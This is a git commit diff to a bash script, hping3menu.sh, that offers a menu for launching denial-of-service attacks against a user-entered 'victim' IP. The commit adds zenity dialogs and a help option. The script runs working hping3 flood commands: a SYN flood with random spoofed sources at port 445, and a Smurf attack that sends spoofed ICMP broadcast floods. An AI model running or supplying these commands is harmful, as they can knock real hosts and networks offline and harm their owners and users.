7c1b6ba00ea3efad531b006af09c71b7bc5c2d89
Mongoose <38100459+Obluchatel@users.noreply.github.com>
2018-06-23 19:44:06 +0200

    Add files via upload

--- hping3menu.sh
+++ hping3menu.sh
@@ -5,24 +5,26 @@
 # Thanks to Dennis Williamson@askubuntu.com && 0daysecurity.com
 
 PS3='Please choose tipe of your attack: '
-options=("DDOS Land Attack" "Smurf Attack" "Help with hping3" "Quit")
+options=("DDOS Land Attack" "Smurf Attack" "Help with hping3" "Manual for hping3" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
         "DDOS Land Attack")
-	echo "Input your victims IP"
-	read foo
+	foo=$(zenity --entry --title="DDOS Land Attack" --text="Input your victims IP")
            sudo  hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $foo
             ;;
         "Smurf Attack")
 	echo "Input your victims IP"
-	read foo
+	foo1=$(zenity --entry --title="Smurf Attack" --text="Input your victims IP")
 	echo "Input broadcast IP"
-	read bar
+	bar=$(zenity --entry --title="Smurf Attack" --text="Input your broadcast IP")
 	##Smurf Attack: This is a type of denial-of-service attack that floods a target system via spoofed broadcast ping messages.
-        sudo  hping3 -1 --flood -a $foo $bar
+        sudo  hping3 -1 --flood -a $foo1 $bar
             ;;
 	"Help with hping3")
+	hping3 --help
+	;;
+	"Manual for hping3")
 	man hping3
 	;;
          "Quit")
